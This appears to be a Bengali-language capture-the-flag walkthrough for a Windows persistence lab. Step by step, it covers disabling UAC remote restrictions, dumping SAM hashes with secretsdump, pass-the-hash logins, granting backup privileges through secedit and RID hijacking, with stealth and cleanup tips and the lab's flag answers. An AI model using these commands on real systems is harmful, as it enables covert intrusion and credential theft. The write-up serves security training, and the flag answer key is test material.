# 🛡️ পার্সিস্টেন্স (স্থায়ী প্রবেশাধিকার) তৈরি: সম্পূর্ণ গাইড

# Task_1: Introduction
**লক্ষ্য:** একটি সাধারণ নিম্ন-ক্ষমতাসম্পন্ন ইউজার অ্যাকাউন্ট ব্যবহার করে সম্পূর্ণ অ্যাডমিনিস্ট্রেটর ক্ষমতা অর্জন করা, যাতে বারবার সিস্টেম হ্যাক না করতে হয়।

---

## 🔑 পূর্বশর্ত (Prerequisite)

- টার্গেট মেশিনে একটি সাধারণ ইউজার অ্যাকাউন্টের পাসওয়ার্ড জানা থাকতে হবে।
- রিমোটে WinRM (পোর্ট 5985/5986) বা RDP (পোর্ট 3389) খোলা থাকতে হবে।
- অ্যাটাকার মেশিনে `evil-winrm` এবং `impacket` টুল ইনস্টল করা থাকতে হবে।

---

# Task_2: Tampering with unpriviliged Accounts

## পার্ট ১: ব্যাকআপ অপারেটর গ্রুপ ব্যবহার (thmuser1)

**কৌশল:** ইউজারকে `Backup Operators` গ্রুপে ঢুকিয়ে SAM ফাইল চুরি করা।

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | `net localgroup "Remote Management Users" thmuser1 /add` | thmuser1 কে WinRM ব্যবহারের অনুমতি দেওয়া। |
| ২ | `evil-winrm -i <IP> -u thmuser1 -p Password321` | রিমোটে thmuser1 হিসেবে লগইন করা। |
| ৩ | `whoami /groups` | দেখা যাবে Backup Operators গ্রুপটি **Disabled** আছে। |
| ৪ | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` | UAC-এর রিমোট রেস্ট্রিকশন তুলে দেওয়া। (পরিবর্তন কার্যকর করতে রিবুট বা রি-লগইন লাগতে পারে) |
| ৫ | `whoami /groups` | এখন Backup Operators **Enabled** এবং লেভেল **High Mandatory** হবে। |
| ৬ | `reg save hklm\system system.bak`<br>`reg save hklm\sam sam.bak` | সিস্টেম ও SAM হাইভের ব্যাকআপ নেওয়া। |
| ৭ | `download system.bak`<br>`download sam.bak` | ফাইল দুটি অ্যাটাকার মেশিনে নামানো। |
| ৮ | `python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL` | SAM ফাইল থেকে অ্যাডমিনিস্ট্রেটরের NTLM হ্যাশ বের করা। |
| ৯ | `evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>` | Pass-the-Hash করে অ্যাডমিন হিসেবে ঢোকা। |
| ১০ | `c:\flags\flag1.exe` | **ফ্ল্যাগ ১:** `THM{FLAG_BACKED_UPI}` |

---

## পার্ট ২: বিশেষ ক্ষমতা প্রদান (thmuser2)

**কৌশল:** কোনো গ্রুপে না ঢুকিয়ে সরাসরি `SeBackupPrivilege` ক্ষমতা দিয়ে ইউজারকে শক্তিশালী করা।

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | `secedit /export /cfg config.inf` | বর্তমান সিকিউরিটি পলিসি ফাইল এক্সপোর্ট করা। |
| ২ | Notepad দিয়ে `config.inf` খোলা। `SeBackupPrivilege` ও `SeRestorePrivilege` লাইনে `,thmuser2` যোগ করা। | thmuser2 কে ফাইল পড়া ও লেখার বিশেষ ক্ষমতা দেওয়া। |
| ৩ | `secedit /import /cfg config.inf /db config.sdb`<br>`secedit /configure /db config.sdb /cfg config.inf` | পরিবর্তিত পলিসি সিস্টেমে প্রয়োগ করা। |
| ৪ | `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` | GUI উইন্ডো খুলবে। এখানে thmuser2 কে Full Control দিয়ে WinRM অ্যাক্সেস দেওয়া। |
| ৫ | `net user thmuser2` | চেক করলে দেখা যাবে সে শুধু `Users` গ্রুপে আছে। সন্দেহজনক কিছু নেই! |
| ৬ | `evil-winrm -i <IP> -u thmuser2 -p Password321` | thmuser2 দিয়ে লগইন করা। |
| ৭ | পার্ট ১-এর ধাপ ৬ থেকে ৯ অনুসরণ করে SAM ডাম্প করা। | একই পদ্ধতিতে অ্যাডমিন হ্যাশ চুরি করা যাবে। |
| ৮ | `c:\flags\flag2.exe` | **ফ্ল্যাগ ২:** `THM{IM_JUST_A_NORMAL_USER}` |

---

## পার্ট ৩: RID Hijacking (thmuser3)

**কৌশল:** রেজিস্ট্রিতে ইউজারের RID পরিবর্তন করে 500 (অ্যাডমিন) করে দেওয়া। এটি সবচেয়ে গোপন পদ্ধতি।

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | `wmic useraccount get name,sid` | ইউজারদের SID দেখা। thmuser3-এর RID = 1010 (হেক্সা: 0x3F2) |
| ২ | `C:\tools\pstools\PsExec64.exe -i -s regedit` | SYSTEM অ্যাকাউন্ট দিয়ে Regedit চালু করা (SAM অ্যাক্সেসের জন্য জরুরি)। |
| ৩ | রেজিস্ট্রি এডিটরে যাও: `HKLM\SAM\SAM\Domains\Account\Users\000003F2` | 1010-এর হেক্সা `3F2` দিয়ে কী খোঁজা। |
| ৪ | `F` নামের বাইনারি ভ্যালুতে ডাবল ক্লিক। অফসেট `0x30` লাইনে যাও। | এটি ইউজারের RID সংরক্ষণ করে। |
| ৫ | `F2 03` পরিবর্তন করে `F4 01` করো। | `F4 01` = Little Endian ফরম্যাটে 0x1F4 (500) |
| ৬ | RDP দিয়ে thmuser3 হিসেবে লগইন করো।<br>Username: `thmuser3`<br>Password: `Password321` | লগইনের পর পূর্ণ অ্যাডমিন ডেস্কটপ পাওয়া যাবে। |
| ৭ | `c:\flags\flag3.exe` | **ফ্ল্যাগ ৩:** `THM{TRUST_ME_IM_AN_ADMIN}` |

---

## 📊 মূল পার্থক্য ও ব্যবহারের সময়

| পদ্ধতি | সুবিধা | অসুবিধা | কখন ব্যবহার করবে |
|:---|:---|:---|:---|
| **Backup Operators** | সরাসরি SAM অ্যাক্সেস দেয় | গ্রুপ মেম্বারশিপ `net user`-এ ধরা পড়ে | যখন তাড়াতাড়ি SAM ডাম্প দরকার |
| **Special Privileges** | গ্রুপ মেম্বারশিপে ধরা পড়ে না | `secedit` কনফিগারেশন কিছুটা জটিল | যখন স্টিলথ (গোপনীয়তা) দরকার |
| **RID Hijacking** | একদম পারফেক্ট গোপনীয়তা। কোনো ট্রেস নেই। | রেজিস্ট্রি এডিটিং রিস্কি। ভুল হলে একাউন্ট নষ্ট। | দীর্ঘমেয়াদী পার্সিস্টেন্সের জন্য সেরা |

---

## ⚠️ মনে রাখার বিষয়

১. **UAC বাইপাস:** `LocalAccountTokenFilterPolicy = 1` সেট করা ছাড়া রিমোট লগইনে অনেক ক্ষমতা কাজ করে না।

২. **SAM ফাইল:** `reg save` কমান্ডটি ব্যাকআপ নেওয়ার জন্য। এটি ইভেন্ট লগে কম সন্দেহ তৈরি করে।

৩. **হেক্সা এডিটিং:** Little Endian ফরম্যাট বুঝতে হবে। 500 = `F4 01` (উল্টো করে বসে)।

৪. **ক্লিনআপ:** কাজ শেষে `config.sdb` ও `.bak` ফাইল ডিলিট করে দিতে ভুলবে না।

---

## 🏁 ফ্ল্যাগসমূহ

| টাস্ক | ফ্ল্যাগ |
|-------|---------|
| thmuser1 (Backup Operators) | `THM{FLAG_BACKED_UPI}` |
| thmuser2 (Special Privileges) | `THM{IM_JUST_A_NORMAL_USER}` |
| thmuser3 (RID Hijacking) | `THM{TRUST_ME_IM_AN_ADMIN}` |

---


---

